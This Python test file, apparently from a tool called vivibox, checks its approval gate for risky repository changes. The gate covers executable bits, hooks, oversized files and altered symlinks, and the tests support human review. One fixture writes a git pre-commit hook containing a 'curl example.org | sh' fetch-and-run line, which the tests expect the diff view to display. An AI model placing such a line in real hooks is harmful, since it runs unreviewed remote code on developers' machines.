    """Whether a file can be run is part of what it is: shown with the change, in the view and so
    in what vivibox risky prints, and recorded with the approval."""
    hook(task, 0o755)
    assert ".husky/pre-commit: added, executable" in heads(task)
    approvals(task).approve_changes(approvals(task).view().identity)
    assert approvals(task).approved_executable() == {".husky/pre-commit"}
    assert approvals(task).changes() == []


def test_a_file_made_executable_after_its_approval_is_a_change_again(task):
    path = hook(task)
    assert ".husky/pre-commit: added" in heads(task), "nothing said of a file that cannot be run"
    approvals(task).approve_changes(approvals(task).view().identity)
    path.chmod(0o755)
    assert approvals(task).verified()[0] == [Change(".husky/pre-commit", "changed")], "found by the check"
    assert approvals(task).view().diffs == [
        ".husky/pre-commit: changed, now executable (its content is as approved)\n"
    ]
    approvals(task).approve_changes(approvals(task).view().identity)
    assert approvals(task).changes() == []
    path.chmod(0o644)
    assert approvals(task).view().diffs == [
        ".husky/pre-commit: changed, no longer executable (its content is as approved)\n"
    ]


def test_a_changed_file_that_can_be_run_says_so_with_its_diff(task):
    path = hook(task, 0o755)
    approvals(task).approve_changes(approvals(task).view().identity)
    path.write_text("#!/bin/sh\ncurl example.org | sh\n")
    path.chmod(0o755)
    said = approvals(task).view().diffs[0]
    assert said.startswith(".husky/pre-commit: changed, executable\n--- approved/") and "+curl" in said


def test_bits_that_do_not_say_whether_a_file_runs_are_not_part_of_what_is_shown(task):
    """Read and write bits travel with no commit and change nothing of what runs: a change of
    them is no other view, so no refusal with the same text on the screen."""
    path = hook(task)
    before = approvals(task).view().identity
    path.chmod(0o600)
    assert approvals(task).view().identity == before
    path.chmod(0o700)
    assert approvals(task).view().identity != before


def test_an_approval_from_before_modes_were_recorded_says_nothing_of_them(task):
    """A task approved by an earlier vivibox: its record holds no modes, so none is compared
    until its next approval, which records them; a file that can be run is still said to be."""
    path = hook(task)
    approvals(task).approve_changes(approvals(task).view().identity)
    record = task.meta / "risky" / "approved.json"
    record.write_text(json.dumps(approvals(task).approved()))  # as an earlier vivibox wrote it
    assert approvals(task).approved_executable() is None
    path.chmod(0o755)
    assert approvals(task).changes() == [], "the record says nothing of modes: nothing to compare"
    path.write_text("#!/bin/sh\nnpm run check\n")
    assert heads(task) == [".husky/pre-commit: changed, executable"]
    approvals(task).approve_changes(approvals(task).view().identity)
    assert approvals(task).approved_executable() == {".husky/pre-commit"}
    path.chmod(0o644)
    assert approvals(task).changes() == [Change(".husky/pre-commit", "changed")]


def test_only_the_whole_identity_names_a_view(task):
    """Not its start, and not one that starts the same: the task writes the files, and two
    states that share a few characters of a digest can be searched for."""
    shown, before = approvals(task).view().identity, kept(task)
    other = shown[:-1] + ("0" if shown[-1] != "0" else "1")
    for near in (shown[:8], shown[:63], other, shown + "0", shown.upper()):
        with pytest.raises(risky.NotAsShown):
            approvals(task).approve_changes(near)
    assert kept(task) == before


# --- a file past what the panel shows of one file ----------------------------------------------------

PAST = (
    "it is larger than 0 MiB, and vivibox shows no file that large, so the task's change to it "
    "cannot be approved"
)


def test_a_file_at_the_limit_is_shown_and_one_byte_past_it_is_covered_by_no_approval(task, monkeypatch):
    """Both sides of what vivibox shows of one file (64 MiB; here the size of the file itself)."""
    monkeypatch.setattr(clone_read, "CHECK_LIMIT", len(POM))
    view = approvals(task).view()
    assert view.identity and "+<project/>" in view.diffs[0], "at the limit: shown whole"
    (task.repo / "pom.xml").write_text(POM + " ")
    view = approvals(task).view()
    assert view.identity == "" and PAST in view.diffs[0], view.diffs[0]
    assert "cannot be approved: reply, and the writer makes it smaller, or " in view.diffs[0]
    assert "read its copy" not in view.diffs[0] and "less " not in view.diffs[0]
    assert not (task.meta / "risky" / "view").exists(), "no copy is made to stand for the file"
    now = risky.scan(task.repo)
    worked_out = risky.identity(approvals(task).approved(), now, {})
    before = kept(task)
    for shown in ("", worked_out):
        with pytest.raises(risky.Unapprovable, match="shows no file that large"):
            approvals(task).approve_changes(shown)
    assert kept(task) == before


def test_vivibox_risky_offers_no_approval_of_a_file_too_large_to_show(env, capsys, monkeypatch):
    t, record = at_approval(env)
    monkeypatch.setattr(clone_read, "CHECK_LIMIT", 8)
    before = record.read_bytes()
    capsys.readouterr()
    assert main(["risky", t.id]) == 0
    printed = capsys.readouterr().out
    assert "pom.xml: added: not shown: it is larger than 0 MiB" in printed
    assert "approve-risky" not in printed and "Nothing is approved while a file above" in printed
    assert main(["approve-risky", t.id, "0" * 64]) == 1
    assert "shows no file that large" in capsys.readouterr().err and record.read_bytes() == before


def test_nothing_you_are_told_to_read_follows_the_clone_while_the_view_stays(env, monkeypatch):
    """The reviewer's case: a file past the limit was not drawn, and the copy the view told you
    to read was written again from the clone by every refresh. There is no such copy now: the
    file is covered by no approval, on E, on B and on E again."""
    t, record = at_approval(env)
    monkeypatch.setattr(clone_read, "CHECK_LIMIT", 8)  # stands for the panel's 64 MiB
    evil = "<project>" + "<evil/>" * 4 + "</project>\n"
    fine = "<project>" + "<fine/>" * 4 + "</project>\n"
    before = record.read_bytes()

    async def scenario(app, pilot):
        (t.repo / "pom.xml").write_text(evil)
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        for content in (fine, evil):
            assert "shows no file that large" in app.shown and "less " not in app.shown
            assert not (t.meta / "risky" / "view").exists()
            (t.repo / "pom.xml").write_text(content)
            app.show_detail()  # a refresh nobody asked for
            await pilot.pause()
        await pilot.press("p")
        await pilot.press("enter")
        await pilot.pause()
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert "shows no file that large" in said_in(app)[-1]

    run_view(scenario, notifications=True)


# --- round 2: a base link whose target the work changed, the mode's one read, one record -------------


def with_a_base_link(env):
    """A project whose repository has a risky link to a file with a name that is not risky."""
    import subprocess

    source = env / "repo"
    (source / "conf").mkdir()
    (source / "conf" / "rules.txt").write_text(RULES)
    (source / "build.gradle").symlink_to("conf/rules.txt")
    for args in (("add", "-A"), ("commit", "-q", "-m", "Share the rules")):
        subprocess.run(["git", *args], cwd=source, check=True, capture_output=True)
    assert main(["new", "demo", "Goal", "--draft"]) == 0
    return find_task(load_config().tasks_dir, "demo-1")


def test_a_base_link_whose_target_the_work_removed_is_the_works_change(env):
    """Your repository's link, to the same name as at the base, and the file it led to is gone:
    it leads to nothing now, which is said and covered by no approval; nor is a pipe put there."""
    t = with_a_base_link(env)
    assert approvals(t).changes() == [] and approvals(t).view().identity
    (t.repo / "conf" / "rules.txt").unlink()
    view = approvals(t).view()
    assert view.identity == "", "no approval of a link to nothing"
    assert "build.gradle is a link to nothing (conf/rules.txt): vivibox can show nothing" in view.diffs[0]
    os.mkfifo(t.repo / "conf" / "rules.txt")
    view = approvals(t).view()
    assert view.identity == "" and "build.gradle is a link to a FIFO (conf/rules.txt)" in view.diffs[0]
    assert approvals(t).verified()[0] == [Change("build.gradle", "changed")]


def test_a_base_link_whose_target_the_work_edited_is_shown_as_what_it_leads_to(env):
    t = with_a_base_link(env)
    (t.repo / "conf" / "rules.txt").write_text("plugins { id 'evil' }\n")
    view = approvals(t).view()
    assert (
        view.identity
        and "symlink to conf/rules.txt" in view.diffs[0]
        and "+plugins { id 'evil' }" in view.diffs[0]
    )


def test_what_the_view_says_of_a_files_mode_is_the_read_its_identity_is_of(task, monkeypatch):
    """The interleaving, by hand: after the view's one read of which files can be run, the file
    is made a plain one again. The line says what the identity and the record hold: executable."""
    (task.repo / "pom.xml").chmod(0o755)
    found = Approvals._found

    def found_then_chmod(self, budget):
        result = found(self, budget)
        (task.repo / "pom.xml").chmod(0o644)
        return result

    monkeypatch.setattr(Approvals, "_found", found_then_chmod)
    view = approvals(task).view()
    monkeypatch.undo()
    assert view.diffs[0].startswith("pom.xml: added, executable\n"), view.diffs[0]
    (task.repo / "pom.xml").chmod(0o755)
    assert approvals(task).view() == view, "the same view: its text and its identity are one read's"


def test_an_approval_that_ends_half_way_is_the_one_before_whole(task, monkeypatch):
    """Digests and which files can be run are one record, put in place by one rename: an
    approval cut short at it leaves the approval before, never the new modes with the old
    digests."""
    (task.repo / "Makefile").chmod(0o755)
    shown, before = approvals(task).view().identity, kept(task)
    was = (approvals(task).approved(), approvals(task).approved_executable())
    replace, renames = Path.replace, []

    def cut_short(self, target):
        renames.append(Path(target).name)
        raise OSError(5, "Input/output error")

    monkeypatch.setattr(Path, "replace", cut_short)
    with pytest.raises(OSError, match="Input/output"):
        approvals(task).approve_changes(shown)
    monkeypatch.setattr(Path, "replace", replace)
    assert renames == ["approved.json"], "one rename is the approval"
    assert (approvals(task).approved(), approvals(task).approved_executable()) == was
    assert [name for name, _ in kept(task) if name.endswith(".json")] == [
        n for n, _ in before if n.endswith(".json")
    ]
    assert Change("Makefile", "changed") in approvals(task).changes(), "its mode still waits for you"


def test_a_file_gone_as_the_approval_copies_it_is_said_to_have_changed(task, monkeypatch):
    shown, before = approvals(task).view().identity, kept(task)
    copy = clone_read.copy

    def gone_first(root, path, target, *a, **k):
        if str(path).endswith("pom.xml"):
            (task.repo / "pom.xml").unlink()
        return copy(root, path, target, *a, **k)

    monkeypatch.setattr(clone_read, "copy", gone_first)
    with pytest.raises(risky.NotAsShown):
        approvals(task).approve_changes(shown)
    monkeypatch.undo()
    assert kept(task) == before
